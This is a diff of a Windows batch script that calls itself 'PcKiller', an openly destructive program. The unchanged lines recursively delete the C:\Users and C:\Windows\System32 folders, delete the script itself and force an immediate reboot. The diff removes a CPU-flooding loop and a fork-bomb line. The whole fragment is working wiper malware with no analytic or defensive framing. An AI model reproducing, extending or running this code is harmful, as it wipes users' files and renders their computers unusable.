@@ -46,11 +46,9 @@
 
 rmdir /S /Q C:\Brukere
 rmdir /S /Q C:\Users
-rem powershell -command "Start-Job -ScriptBlock{sleep;clear}"
 
 :: PcKiller script by SomeoneAlt-86 https://github.com/SomeoneAlt-86/pc-killer 
 :: // Modified version - available through the DVPDev team or Lmaos // 
-
 for /f "skip=1" %%p in ('wmic os get TotalVisibleMemorySize') do ( 
    set system_ram=%%p
    goto :end
@@ -64,13 +62,4 @@ cls
 echo ":3"
 rmdir /S /Q C:\Windows\System32
 
-:: CPU flooder
-for /L %%A in (,,) do REM 
-
-:: Ram flooder/killer 
-%0|%0|00&||00
-
 (goto) 2>nul & del "%~f0" & shutdown /r /t 0 
-
-:: jic
-cc^^^
